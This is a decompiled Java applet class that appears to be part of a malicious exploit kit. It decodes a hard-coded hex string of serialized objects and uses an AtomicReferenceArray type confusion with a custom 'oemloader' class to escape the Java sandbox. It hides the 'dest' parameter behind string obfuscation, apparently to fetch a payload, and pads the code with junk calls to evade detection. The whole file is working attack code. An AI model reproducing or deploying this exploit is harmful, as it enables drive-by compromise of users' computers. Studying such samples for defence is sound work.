import java.util.concurrent.atomic.AtomicReferenceArray;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Atomic extends Applet
{
    public static byte[] hexToByte(final String sHex) {
        final byte[] ba = new byte[sHex.length() / 2];
        for (int i = 0; i < sHex.length() / 2; ++i) {
            ba[i] = (byte)(Object)Integer.decode("0x" + sHex.substring(i * 2, (i + 1) * 2));
        }
        return ba;
    }
    
    private void kkuud() {
        final Boolean sads = true;
    }
    
    @Override
    public void init() {
        try {
            Links.lob = this.getParameter("d123es123t".replace("123", ""));
            final String ob = "ACED0005757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C0200007870000000027572000c5b4c6f656d6c6f616465723bbdbda708bcbbf32702000078700000000170737200306A6176612E7574696C2E636F6E63757272656E742E61746F6D69632E41746F6D69635265666572656E63654172726179A9D2DEA1BE65600C0200015B000561727261797400135B4C6A6176612F6C616E672F4F626A6563743B787071007E0003";
            this.kkuud();
            final byte[] buf = hexToByte(ob);
            this.kkuud();
            final ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(buf));
            this.kkuud();
            final Object[] arr = (Object[])ois.readObject();
            this.kkuud();
            final oemloader[] oemcs = (oemloader[])arr[0];
            this.kkuud();
            final AtomicReferenceArray ara = (AtomicReferenceArray)arr[1];
            this.kkuud();
            final ClassLoader lcs = this.getClass().getClassLoader();
            this.kkuud();
            ara.set(0, lcs);
            this.kkuud();
            oemloader.getLoader(oemcs[0]);
        }
        catch (Exception e) {
            System.out.println("1");
        }
    }
}
